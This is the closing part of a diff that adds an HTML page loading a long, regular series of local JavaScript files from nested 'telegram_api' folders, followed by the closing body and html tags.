+    <script src="telegram_api_20/telegram_api_20_3/telegram_api_20_3_2.js"></script>
+    <script src="telegram_api_20/telegram_api_20_3/telegram_api_20_3_3.js"></script>
+    <script src="telegram_api_20/telegram_api_20_4/telegram_api_20_4_1.js"></script>
+    <script src="telegram_api_20/telegram_api_20_4/telegram_api_20_4_2.js"></script>
+    <script src="telegram_api_20/telegram_api_20_4/telegram_api_20_4_3.js"></script>
+    <script src="telegram_api_20/telegram_api_20_5/telegram_api_20_5_1.js"></script>
+    <script src="telegram_api_20/telegram_api_20_5/telegram_api_20_5_2.js"></script>
+    <script src="telegram_api_20/telegram_api_20_5/telegram_api_20_5_3.js"></script>
+    <script src="telegram_api_3/telegram_api_3_1/telegram_api_3_1_1.js"></script>
+    <script src="telegram_api_3/telegram_api_3_1/telegram_api_3_1_2.js"></script>
+    <script src="telegram_api_3/telegram_api_3_1/telegram_api_3_1_3.js"></script>
+    <script src="telegram_api_3/telegram_api_3_2/telegram_api_3_2_1.js"></script>
+    <script src="telegram_api_3/telegram_api_3_2/telegram_api_3_2_2.js"></script>
+    <script src="telegram_api_3/telegram_api_3_2/telegram_api_3_2_3.js"></script>
+    <script src="telegram_api_3/telegram_api_3_3/telegram_api_3_3_1.js"></script>
+    <script src="telegram_api_3/telegram_api_3_3/telegram_api_3_3_2.js"></script>
+    <script src="telegram_api_3/telegram_api_3_3/telegram_api_3_3_3.js"></script>
+    <script src="telegram_api_3/telegram_api_3_4/telegram_api_3_4_1.js"></script>
+    <script src="telegram_api_3/telegram_api_3_4/telegram_api_3_4_2.js"></script>
+    <script src="telegram_api_3/telegram_api_3_4/telegram_api_3_4_3.js"></script>
+    <script src="telegram_api_3/telegram_api_3_5/telegram_api_3_5_1.js"></script>
+    <script src="telegram_api_3/telegram_api_3_5/telegram_api_3_5_2.js"></script>
+    <script src="telegram_api_3/telegram_api_3_5/telegram_api_3_5_3.js"></script>
+    <script src="telegram_api_4/telegram_api_4_1/telegram_api_4_1_1.js"></script>
+    <script src="telegram_api_4/telegram_api_4_1/telegram_api_4_1_2.js"></script>
+    <script src="telegram_api_4/telegram_api_4_1/telegram_api_4_1_3.js"></script>
+    <script src="telegram_api_4/telegram_api_4_2/telegram_api_4_2_1.js"></script>
+    <script src="telegram_api_4/telegram_api_4_2/telegram_api_4_2_2.js"></script>
+    <script src="telegram_api_4/telegram_api_4_2/telegram_api_4_2_3.js"></script>
+    <script src="telegram_api_4/telegram_api_4_3/telegram_api_4_3_1.js"></script>
+    <script src="telegram_api_4/telegram_api_4_3/telegram_api_4_3_2.js"></script>
+    <script src="telegram_api_4/telegram_api_4_3/telegram_api_4_3_3.js"></script>
+    <script src="telegram_api_4/telegram_api_4_4/telegram_api_4_4_1.js"></script>
+    <script src="telegram_api_4/telegram_api_4_4/telegram_api_4_4_2.js"></script>
+    <script src="telegram_api_4/telegram_api_4_4/telegram_api_4_4_3.js"></script>
+    <script src="telegram_api_4/telegram_api_4_5/telegram_api_4_5_1.js"></script>
+    <script src="telegram_api_4/telegram_api_4_5/telegram_api_4_5_2.js"></script>
+    <script src="telegram_api_4/telegram_api_4_5/telegram_api_4_5_3.js"></script>
+    <script src="telegram_api_5/telegram_api_5_1/telegram_api_5_1_1.js"></script>
+    <script src="telegram_api_5/telegram_api_5_1/telegram_api_5_1_2.js"></script>
+    <script src="telegram_api_5/telegram_api_5_1/telegram_api_5_1_3.js"></script>
+    <script src="telegram_api_5/telegram_api_5_2/telegram_api_5_2_1.js"></script>
+    <script src="telegram_api_5/telegram_api_5_2/telegram_api_5_2_2.js"></script>
+    <script src="telegram_api_5/telegram_api_5_2/telegram_api_5_2_3.js"></script>
+    <script src="telegram_api_5/telegram_api_5_3/telegram_api_5_3_1.js"></script>
+    <script src="telegram_api_5/telegram_api_5_3/telegram_api_5_3_2.js"></script>
+    <script src="telegram_api_5/telegram_api_5_3/telegram_api_5_3_3.js"></script>
+    <script src="telegram_api_5/telegram_api_5_4/telegram_api_5_4_1.js"></script>
+    <script src="telegram_api_5/telegram_api_5_4/telegram_api_5_4_2.js"></script>
+    <script src="telegram_api_5/telegram_api_5_4/telegram_api_5_4_3.js"></script>
+    <script src="telegram_api_5/telegram_api_5_5/telegram_api_5_5_1.js"></script>
+    <script src="telegram_api_5/telegram_api_5_5/telegram_api_5_5_2.js"></script>
+    <script src="telegram_api_5/telegram_api_5_5/telegram_api_5_5_3.js"></script>
+    <script src="telegram_api_6/telegram_api_6_1/telegram_api_6_1_1.js"></script>
+    <script src="telegram_api_6/telegram_api_6_1/telegram_api_6_1_2.js"></script>
+    <script src="telegram_api_6/telegram_api_6_1/telegram_api_6_1_3.js"></script>
+    <script src="telegram_api_6/telegram_api_6_2/telegram_api_6_2_1.js"></script>
+    <script src="telegram_api_6/telegram_api_6_2/telegram_api_6_2_2.js"></script>
+    <script src="telegram_api_6/telegram_api_6_2/telegram_api_6_2_3.js"></script>
+    <script src="telegram_api_6/telegram_api_6_3/telegram_api_6_3_1.js"></script>
+    <script src="telegram_api_6/telegram_api_6_3/telegram_api_6_3_2.js"></script>
+    <script src="telegram_api_6/telegram_api_6_3/telegram_api_6_3_3.js"></script>
+    <script src="telegram_api_6/telegram_api_6_4/telegram_api_6_4_1.js"></script>
+    <script src="telegram_api_6/telegram_api_6_4/telegram_api_6_4_2.js"></script>
+    <script src="telegram_api_6/telegram_api_6_4/telegram_api_6_4_3.js"></script>
+    <script src="telegram_api_6/telegram_api_6_5/telegram_api_6_5_1.js"></script>
+    <script src="telegram_api_6/telegram_api_6_5/telegram_api_6_5_2.js"></script>
+    <script src="telegram_api_6/telegram_api_6_5/telegram_api_6_5_3.js"></script>
+    <script src="telegram_api_7/telegram_api_7_1/telegram_api_7_1_1.js"></script>
+    <script src="telegram_api_7/telegram_api_7_1/telegram_api_7_1_2.js"></script>
+    <script src="telegram_api_7/telegram_api_7_1/telegram_api_7_1_3.js"></script>
+    <script src="telegram_api_7/telegram_api_7_2/telegram_api_7_2_1.js"></script>
+    <script src="telegram_api_7/telegram_api_7_2/telegram_api_7_2_2.js"></script>
+    <script src="telegram_api_7/telegram_api_7_2/telegram_api_7_2_3.js"></script>
+    <script src="telegram_api_7/telegram_api_7_3/telegram_api_7_3_1.js"></script>
+    <script src="telegram_api_7/telegram_api_7_3/telegram_api_7_3_2.js"></script>
+    <script src="telegram_api_7/telegram_api_7_3/telegram_api_7_3_3.js"></script>
+    <script src="telegram_api_7/telegram_api_7_4/telegram_api_7_4_1.js"></script>
+    <script src="telegram_api_7/telegram_api_7_4/telegram_api_7_4_2.js"></script>
+    <script src="telegram_api_7/telegram_api_7_4/telegram_api_7_4_3.js"></script>
+    <script src="telegram_api_7/telegram_api_7_5/telegram_api_7_5_1.js"></script>
+    <script src="telegram_api_7/telegram_api_7_5/telegram_api_7_5_2.js"></script>
+    <script src="telegram_api_7/telegram_api_7_5/telegram_api_7_5_3.js"></script>
+    <script src="telegram_api_8/telegram_api_8_1/telegram_api_8_1_1.js"></script>
+    <script src="telegram_api_8/telegram_api_8_1/telegram_api_8_1_2.js"></script>
+    <script src="telegram_api_8/telegram_api_8_1/telegram_api_8_1_3.js"></script>
+    <script src="telegram_api_8/telegram_api_8_2/telegram_api_8_2_1.js"></script>
+    <script src="telegram_api_8/telegram_api_8_2/telegram_api_8_2_2.js"></script>
+    <script src="telegram_api_8/telegram_api_8_2/telegram_api_8_2_3.js"></script>
+    <script src="telegram_api_8/telegram_api_8_3/telegram_api_8_3_1.js"></script>
+    <script src="telegram_api_8/telegram_api_8_3/telegram_api_8_3_2.js"></script>
+    <script src="telegram_api_8/telegram_api_8_3/telegram_api_8_3_3.js"></script>
+    <script src="telegram_api_8/telegram_api_8_4/telegram_api_8_4_1.js"></script>
+    <script src="telegram_api_8/telegram_api_8_4/telegram_api_8_4_2.js"></script>
+    <script src="telegram_api_8/telegram_api_8_4/telegram_api_8_4_3.js"></script>
+    <script src="telegram_api_8/telegram_api_8_5/telegram_api_8_5_1.js"></script>
+    <script src="telegram_api_8/telegram_api_8_5/telegram_api_8_5_2.js"></script>
+    <script src="telegram_api_8/telegram_api_8_5/telegram_api_8_5_3.js"></script>
+    <script src="telegram_api_9/telegram_api_9_1/telegram_api_9_1_1.js"></script>
+    <script src="telegram_api_9/telegram_api_9_1/telegram_api_9_1_2.js"></script>
+    <script src="telegram_api_9/telegram_api_9_1/telegram_api_9_1_3.js"></script>
+    <script src="telegram_api_9/telegram_api_9_2/telegram_api_9_2_1.js"></script>
+    <script src="telegram_api_9/telegram_api_9_2/telegram_api_9_2_2.js"></script>
+    <script src="telegram_api_9/telegram_api_9_2/telegram_api_9_2_3.js"></script>
+    <script src="telegram_api_9/telegram_api_9_3/telegram_api_9_3_1.js"></script>
+    <script src="telegram_api_9/telegram_api_9_3/telegram_api_9_3_2.js"></script>
+    <script src="telegram_api_9/telegram_api_9_3/telegram_api_9_3_3.js"></script>
+    <script src="telegram_api_9/telegram_api_9_4/telegram_api_9_4_1.js"></script>
+    <script src="telegram_api_9/telegram_api_9_4/telegram_api_9_4_2.js"></script>
+    <script src="telegram_api_9/telegram_api_9_4/telegram_api_9_4_3.js"></script>
+    <script src="telegram_api_9/telegram_api_9_5/telegram_api_9_5_1.js"></script>
+    <script src="telegram_api_9/telegram_api_9_5/telegram_api_9_5_2.js"></script>
+    <script src="telegram_api_9/telegram_api_9_5/telegram_api_9_5_3.js"></script> 
+
+</body>
+</html>
